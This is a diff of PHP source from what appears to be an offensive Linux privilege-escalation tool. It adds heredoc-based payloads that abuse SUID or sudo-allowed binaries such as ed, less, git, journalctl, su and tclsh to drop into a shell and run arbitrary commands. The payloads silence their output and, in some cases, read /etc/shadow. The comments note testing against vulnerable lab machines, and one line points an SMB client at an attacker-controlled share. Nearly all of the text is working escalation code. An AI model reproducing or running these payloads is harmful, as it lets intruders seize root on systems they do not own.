@@ -2162,6 +2162,9 @@ EOC;
 	                $data = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\"; ) | socat - EXEC:\"dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid\"; sleep 2; echo \"$cmd\";  sleep 30 ) | socat - EXEC:\"sudo dmesg -H\",pty,stderr,setsid,sigint,ctty,sane";
 	                
+	                $data = "echo -e \"$this->file_name -H <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name -H <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break ;
 	            case "dmsetup":
 	                $data = "$this->file_path ls --exec \"$via_suid -c $cmd\" ";
@@ -2192,6 +2195,10 @@ EOC;
 	            case "ed": // OK lin.Security
 	                $data = "(sleep 15; echo \"! $cmd\"; ) | socat - EXEC:\"ed\",pty,stderr,setsid,sigint,ctty,sane";
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 30 ) | socat - EXEC:\"sudo ed\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n! $cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n! $cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	            case "emacs":
@@ -2214,6 +2221,10 @@ EOC;
 	            case "expect": // OK lin.Security
 	                $data = "(sleep 15; echo \"$via_suid -c $cmd\"; ) | socat - EXEC:\"expect -i\",pty,stderr,setsid,sigint,ctty,sane";
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c $cmd\";  sleep 30 ) | socat - EXEC:\"sudo expect -i\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name -i<<# >/dev/null 2>&1\n$via_suid -c $cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name -i<<# >/dev/null 2>&1\n$userpass\n$via_suid -c $cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2244,6 +2255,10 @@ EOC;
 	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"ftp\",pty,stderr,setsid,sigint,ctty,sane";
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ; sleep 2;echo \"! $cmd\"; sleep 30) | socat - EXEC:\"sudo ftp\",pty,stderr,setsid,sigint,ctty,sane";	                
 	                $data_sudo = "echo \"! $cmd\"| sudo ftp";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n! $cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n! $cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2262,6 +2277,11 @@ EOC;
 	                
 	            case "git": // OK id + No rev Lin.Security
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\"; sleep 30;) | socat - EXEC:\"sudo git help status\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name help status<<# >/dev/null 2>&1\n! $via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name help status<<# >/dev/null 2>&1\n$userpass\n!$ via_suid\n$cmd\n#\" | sh  ";
+	                
+	                // git -p help\n!/bin/sh
 	                break;
 	                
 	                
@@ -2284,6 +2304,10 @@ exec \"/bin/bash\" ";
 	                
 	            case "journalctl":
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo journalctl\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n!$via_suid\n$cmd\n#\" | sh ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\"  | sh ";
+	                
 	                break;
 	                
 
@@ -2312,6 +2336,10 @@ exec \"/bin/bash\" ";
 	            case "less": // OK lin.Security
 	                $data = "(sleep 15; echo \"! $cmd\"; ) | socat - EXEC:\"$this->file_path /etc/passwd\",pty,stderr,setsid,sigint,ctty,sane";	                
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/shadow\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2346,6 +2374,10 @@ exec \"/bin/bash\" ";
 	                $data = "(sleep 15; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | socat - EXEC:\"$this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! bash -li\";sleep 2 ; echo \"$cmd\";sleep 20 ) | socat - EXEC:\"sudo $this->file_path man\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2355,6 +2387,10 @@ exec \"/bin/bash\" ";
 	            case "more": // OK lin.Security
 	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"$this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	            case "mount":
@@ -2447,6 +2483,10 @@ sh X sh X $cmd ";
 	                
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R^X\"; sleep 2; echo \"reset; $via_suid $cmd \"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R\"; sleep 2; echo \"^X\"; sleep 2; echo \"reset; $via_suid $cmd 1>&0 2>&0\"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2532,6 +2572,10 @@ sh X sh X $cmd ";
 	                //$data_sudo = "TF=\$(mktemp) && echo \"$cmd 0<&2 1>&2\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -S \$TF x y: 0<&2 1>&2 ";
 	                $data_sudo = "echo \"$via_suid -c $cmd > /tmp/rst.txt \" > $this->vm_tmp_lin/$sha1_hash.sh && chmod +x $this->vm_tmp_lin/$sha1_hash.sh ; $via_sudo $this->file_path -S $this->vm_tmp_lin/$sha1_hash.sh x y: ; cat /tmp/rst.txt "; // OK
 	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"echo \\\"/bin/bash -p -c $cmd\\\" > $this->vm_tmp_lin/tst.sh && chmod 6777 $this->vm_tmp_lin/tst.sh\"; sleep 2; $this->vm_tmp_lin/tst.sh; sleep 30) | socat - EXEC:\"sudo $this->file_path -S $this->vm_tmp_lin/tst.sh x y\:\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2564,6 +2608,10 @@ sh X sh X $cmd ";
 	                break ;
 	            case "sftp":
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"$this->file_path\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2579,6 +2627,10 @@ sh X sh X $cmd ";
 	                $note = "$this->file_path '\\$attacker_ip\share'
 !$via_suid  -c  $cmd ";
 	                $this->note($note);
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	                
@@ -2640,6 +2692,10 @@ sh X sh X $cmd ";
 	            case "su":
 	                $data = "(sleep 15 ; echo '$userpass'; sleep 2) |  socat - EXEC:'$this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
 	                $data_sudo = "(sleep 15 ; echo '$userpass'; sleep 2) |  socat - EXEC:'sudo $this->file_path --shell /bin/sh --command $cmd',pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	            case "systemctl":
@@ -2668,6 +2724,10 @@ sh X sh X $cmd ";
 	                
 	            case "tclsh":// OK lin.Security
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c $cmd\"; sleep 30 ) | socat - EXEC:\"sudo tclsh\",pty,stderr,setsid,sigint,ctty,sane";
+	                
+	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
+	                
 	                break;
 	                
 	            case "tcpdump": // OK webdeveloper
